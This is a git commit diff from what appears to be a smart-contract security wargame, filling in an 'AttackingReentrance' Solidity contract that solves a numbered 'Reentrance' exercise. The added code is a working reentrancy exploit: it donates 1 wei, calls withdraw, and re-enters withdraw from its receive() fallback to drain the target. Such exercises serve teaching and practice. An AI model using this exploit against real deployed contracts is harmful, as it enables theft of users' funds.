51dd497c109a15768c1f244cca79e4b23a0149a2
Daniel Cortes <danielgcortes@gmail.com>
2022-05-21 11:54:26 -0700

    Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,21 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance private reentrance;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentrance = Reentrance(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        address payable addr = payable(this);
+        reentrance.donate{value: 1 wei}(addr);
+
+        reentrance.withdraw();
+    }
+
+    receive() external payable {
+        reentrance.withdraw();
     }
 }
